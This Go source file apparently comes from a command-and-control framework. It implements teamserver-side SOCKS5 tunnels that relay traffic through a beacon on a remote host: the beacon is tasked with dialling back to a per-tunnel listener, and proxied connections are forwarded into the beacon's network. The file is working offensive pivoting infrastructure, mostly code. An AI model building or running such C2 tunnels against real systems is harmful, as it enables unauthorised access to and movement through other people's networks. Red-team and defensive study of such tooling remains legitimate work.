package c2

import (
	"encoding/json"
	"fmt"
	"io"
	"net"
	"sync"
	"time"

	"github.com/RestXtra/RestXtraAI/db"
)

type runningTunnel struct {
	t        *db.C2Tunnel
	linkLn   net.Listener
	linkAddr string // teamserver:linkPort reachable by the beacon
	mu       sync.Mutex
	link     *beaconLink
	socksLn  net.Listener
	stop     chan struct{}
	done     chan struct{}
}

// StartTunnel starts a SOCKS tunnel that relays through the given beacon
// session. It:
//  1. opens a per-tunnel TCP link listener on the teamserver
//  2. enqueues a tunnel_open task so the beacon dials back and holds the link
//  3. starts a SOCKS5 proxy on the requested bind address/port
//
// beaconAddr is the teamserver address the beacon can reach (VPS public IP or
// the local/LAN IP when running on a VM).
func (m *Manager) StartTunnel(t *db.C2Tunnel, beaconAddr string) error {
	if t == nil || t.SessionID == "" {
		return fmt.Errorf("invalid tunnel")
	}
	m.mu.Lock()
	if _, ok := m.tunnels[t.ID]; ok {
		m.mu.Unlock()
		return fmt.Errorf("tunnel %d already running", t.ID)
	}
	m.mu.Unlock()

	if beaconAddr == "" {
		beaconAddr = localIP()
	}

	linkLn, err := net.Listen("tcp", "0.0.0.0:0")
	if err != nil {
		return err
	}
	linkPort := linkLn.Addr().(*net.TCPAddr).Port

	rt := &runningTunnel{
		t:        t,
		linkLn:   linkLn,
		linkAddr: fmt.Sprintf("%s:%d", beaconAddr, linkPort),
		stop:     make(chan struct{}),
		done:     make(chan struct{}),
	}

	m.mu.Lock()
	m.tunnels[t.ID] = rt
	m.mu.Unlock()

	// ask the beacon to hold a link back to us
	payload, _ := json.Marshal(map[string]any{"tunnel_id": t.ID, "addr": rt.linkAddr})
	_, _ = m.db.CreateC2Task(t.SessionID, "tunnel_open "+string(payload), "tunnel:"+t.SessionID, nil)

	// link accept loop
	go rt.acceptLinks()

	// SOCKS proxy
	if t.Kind == "socks5" {
		socksLn, err := net.Listen("tcp", net.JoinHostPort(t.BindHost, fmt.Sprintf("%d", t.BindPort)))
		if err != nil {
			rt.close()
			m.mu.Lock()
			delete(m.tunnels, t.ID)
			m.mu.Unlock()
			_ = m.db.SetC2TunnelState(t.ID, "error", err.Error())
			return err
		}
		rt.socksLn = socksLn
		go rt.acceptSOCKS()
	}

	_ = m.db.SetC2TunnelState(t.ID, "running", "")
	return nil
}

func (m *Manager) StopTunnel(id int64) error {
	m.mu.Lock()
	rt, ok := m.tunnels[id]
	if ok {
		delete(m.tunnels, id)
	}
	m.mu.Unlock()
	if !ok {
		_ = m.db.SetC2TunnelState(id, "stopped", "")
		return nil
	}
	rt.close()
	_ = m.db.SetC2TunnelState(id, "stopped", "")
	return nil
}

func (m *Manager) RunningTunnel(id int64) bool {
	m.mu.Lock()
	defer m.mu.Unlock()
	_, ok := m.tunnels[id]
	return ok
}

func (rt *runningTunnel) close() {
	close(rt.stop)
	if rt.socksLn != nil {
		_ = rt.socksLn.Close()
	}
	if rt.linkLn != nil {
		_ = rt.linkLn.Close()
	}
	rt.mu.Lock()
	if rt.link != nil {
		_ = rt.link.conn.(io.Closer).Close()
		rt.link = nil
	}
	rt.mu.Unlock()
	<-rt.done
}

func (rt *runningTunnel) acceptLinks() {
	defer close(rt.done)
	for {
		conn, err := rt.linkLn.Accept()
		if err != nil {
			select {
			case <-rt.stop:
				return
			default:
				return
			}
		}
		rt.mu.Lock()
		if rt.link != nil {
			_ = rt.link.conn.(io.Closer).Close()
		}
		rt.link = newBeaconLink(conn)
		rt.mu.Unlock()
	}
}

func (rt *runningTunnel) getLink() *beaconLink {
	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		rt.mu.Lock()
		l := rt.link
		rt.mu.Unlock()
		if l != nil {
			return l
		}
		time.Sleep(200 * time.Millisecond)
	}
	return nil
}

// acceptSOCKS runs the SOCKS5 proxy that relays each connection through the
// beacon's held link.
func (rt *runningTunnel) acceptSOCKS() {
	for {
		conn, err := rt.socksLn.Accept()
		if err != nil {
			select {
			case <-rt.stop:
				return
			default:
				return
			}
		}
		go rt.handleSOCKS(conn)
	}
}

func (rt *runningTunnel) handleSOCKS(conn net.Conn) {
	defer conn.Close()
	link := rt.getLink()
	if link == nil {
		return
	}

	// greeting
	greet := make([]byte, 2)
	if _, err := io.ReadFull(conn, greet); err != nil {
		return
	}
	if greet[0] != 0x05 {
		return
	}
	methods := make([]byte, int(greet[1]))
	if _, err := io.ReadFull(conn, methods); err != nil {
		return
	}
	if _, err := conn.Write([]byte{0x05, 0x00}); err != nil { // no-auth
		return
	}

	// request
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return
	}
	if hdr[1] != 0x01 { // CONNECT only
		return
	}
	var host string
	switch hdr[3] {
	case 0x01:
		b := make([]byte, 4)
		if _, err := io.ReadFull(conn, b); err != nil {
			return
		}
		host = net.IP(b).String()
	case 0x03:
		l := make([]byte, 1)
		if _, err := io.ReadFull(conn, l); err != nil {
			return
		}
		b := make([]byte, int(l[0]))
		if _, err := io.ReadFull(conn, b); err != nil {
			return
		}
		host = string(b)
	case 0x04:
		b := make([]byte, 16)
		if _, err := io.ReadFull(conn, b); err != nil {
			return
		}
		host = net.IP(b).String()
	default:
		return
	}
	portB := make([]byte, 2)
	if _, err := io.ReadFull(conn, portB); err != nil {
		return
	}
	port := int(portB[0])<<8 | int(portB[1])
	target := net.JoinHostPort(host, fmt.Sprintf("%d", port))

	stream, ch := link.newStream()
	defer link.closeStream(stream)
	if err := link.write(frameDial, stream, []byte(target)); err != nil {
		return
	}

	// wait for the beacon's dial ack
	var ack framed
	select {
	case ack = <-ch:
	case <-time.After(15 * time.Second):
		return
	}
	if ack.typ != frameDial || string(ack.payload) != "ok" {
		return
	}
	if _, err := conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0}); err != nil {
		return
	}

	// bidirectional relay
	var wg sync.WaitGroup
	wg.Add(2)
	go func() { // conn -> link
		defer wg.Done()
		buf := make([]byte, 32*1024)
		for {
			n, err := conn.Read(buf)
			if n > 0 {
				if werr := link.write(frameData, stream, buf[:n]); werr != nil {
					return
				}
			}
			if err != nil {
				_ = link.write(frameClose, stream, nil)
				return
			}
		}
	}()
	go func() { // link -> conn
		defer wg.Done()
		for fr := range ch {
			switch fr.typ {
			case frameData:
				if _, err := conn.Write(fr.payload); err != nil {
					return
				}
			case frameClose:
				return
			}
		}
	}()
	wg.Wait()
}

// localIP returns a non-loopback IPv4 of the teamserver host.
func localIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "127.0.0.1"
	}
	for _, a := range addrs {
		if ipn, ok := a.(*net.IPNet); ok && !ipn.IP.IsLoopback() {
			if ip := ipn.IP.To4(); ip != nil {
				return ip.String()
			}
		}
	}
	return "127.0.0.1"
}
